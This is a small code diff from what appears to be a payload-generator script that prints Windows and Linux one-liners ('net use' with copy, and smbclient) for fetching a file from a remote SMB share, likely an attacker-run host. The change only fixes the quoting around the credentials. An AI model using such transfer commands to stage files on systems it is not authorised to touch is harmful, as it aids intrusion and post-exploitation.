@@ -137,7 +137,7 @@ if __name__ == "__main__":
         elif method == "smb (net use;copy)":
             payload = "net use \\\\"+ip+"\\share /USER:"+smb_user+" "+smb_password+" && copy \\\\"+ip+"\\share\\"+os.path.split(file_path)[-1]+" "+os.path.split(file_path)[-1]+" & net use \\\\"+ip+"\\share /del"
         elif method == "smbclient":
-            payload = 'smbclient "//'+ip+'/share" -U "'+smb_user+'%'+smb_password+'" -c "get '+os.path.split(file_path)[-1]+'"'
+            payload = 'smbclient "//'+ip+'/share" -U \''+smb_user+'%'+smb_password+'\' -c "get '+os.path.split(file_path)[-1]+'"'
         print(payload)
     else:
         print("Invalid parameters")
